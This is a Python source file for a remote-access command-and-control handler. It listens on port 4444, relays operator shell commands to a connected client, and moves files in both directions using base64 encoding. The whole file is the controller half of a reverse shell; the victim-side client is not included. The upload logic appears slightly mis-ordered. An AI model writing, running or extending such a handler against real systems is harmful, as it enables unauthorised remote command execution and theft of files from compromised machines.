import socket
from colorama import Fore, Style, init
import json
import base64

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = "127.0.0.1"  # Replace with your server's IP address
PORT = 4444  # Replace with your desired port

# Print starting message
print(Fore.GREEN + "Starting TCP Handler...")

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

# Wait for a connection
print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

def send_json(data):
    json_data = json.dumps(data)  # Convert to JSON
    client_socket.send(json_data.encode())  # Send data

def recieve_json():
    json_data = ""
    while True:
        try:
            json_data = json_data + client_socket.recv(1024).decode()  # Decode bytes to string
            return json.loads(json_data)  # Return the complete JSON data
        except ValueError:
            continue

def write_file(path, content):
    with open(path, "wb") as file:  # Write binary file
        file.write(base64.b64decode(content))
    return "[+] Download successful [+]"

def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()  # Encode file content to base64

try:
    while True:
        # Receive the prompt from the client
        prompt = client_socket.recv(1024).decode("utf-8")
        print(Fore.CYAN + prompt, end="")

        # Get user input
        command = input()

        # Send the command to the client
        send_json(command)

        if command.lower() == "km":
            print(Fore.RED + "Disconnecting from client...")
            client_socket.close()
            break

        # Receive the output from the client
        output = recieve_json()

        if command.startswith("upload"):
            file_content = read_file(command.split()[1])  # Read the file to upload
            send_json(["upload", command.split()[1], file_content])

        if command.startswith("download"):
            response = write_file(command.split()[1], output)  # Save the file after download
            print(response)
        else:
            print(Fore.WHITE + output)

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
